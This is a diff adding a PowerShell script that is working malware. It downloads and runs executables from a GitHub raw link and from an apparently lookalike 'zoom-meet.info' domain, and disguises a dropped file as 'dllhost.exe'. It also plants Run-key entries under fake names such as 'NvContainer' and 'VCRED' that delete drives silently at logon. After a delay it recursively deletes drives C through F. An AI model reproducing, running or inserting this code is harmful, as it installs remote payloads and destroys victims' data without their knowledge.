@@ -1,0 +1,35 @@
+Invoke-WebRequest -Uri "https://github.com/MinisterRiddle/calc-java/raw/refs/heads/main/123.exe" -OutFile "$env:TEMP\Everything.exe"
+Start-Process "$env:TEMP\Everything.exe"
+
+$r = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
+$n = "tkn"
+$e = "$env:LOCALAPPDATA\Microsoft\dllhost.exe"
+$u = "https://zoom-meet.info/qwe.exe"
+if (Test-Path $r) {
+    $v = (Get-ItemProperty -Path $r -Name $n -ErrorAction 0).$n
+    if ($v -and ((Get-Date) - [datetime]$v).TotalDays -lt 7) { exit }
+}
+iwr $u -OutFile $e -UseBasicParsing -ErrorAction Stop
+if (-not (Test-Path $r)) { New-Item $r -Force | Out-Null }
+Set-ItemProperty -Path $r -Name $n -Value (Get-Date -Format o) -Type String -Force
+Start-Process $e -PassThru
+
+
+
+
+
+
+
+
+
+
+$u="ССЫЛКА НА ЕХЕ";$f="$env:appdata\fdsas.exe";(new-object net.webclient).downloadfile($u,$f);start $f
+Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'NvContainer' -Value 'powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Start-Process cmd -ArgumentList ''/c rd /s /q C:\'' -WindowStyle Hidden -PassThru"'
+
+Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'VCRED' -Value 'powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Start-Process cmd -ArgumentList ''/c rd /s /q D:\'' -WindowStyle Hidden -PassThru"'
+
+sleep 1800;
+Start-Process -FilePath "cmd" -ArgumentList @("/c", "rd /s /q C:") -PassThru -WindowStyle Hidden;
+Start-Process -FilePath "cmd" -ArgumentList @("/c", "rd /s /q D:") -PassThru -WindowStyle Hidden;
+Start-Process -FilePath "cmd" -ArgumentList @("/c", "rd /s /q E:") -PassThru -WindowStyle Hidden;
+Start-Process -FilePath "cmd" -ArgumentList @("/c", "rd /s /q F:") -PassThru -WindowStyle Hidden;
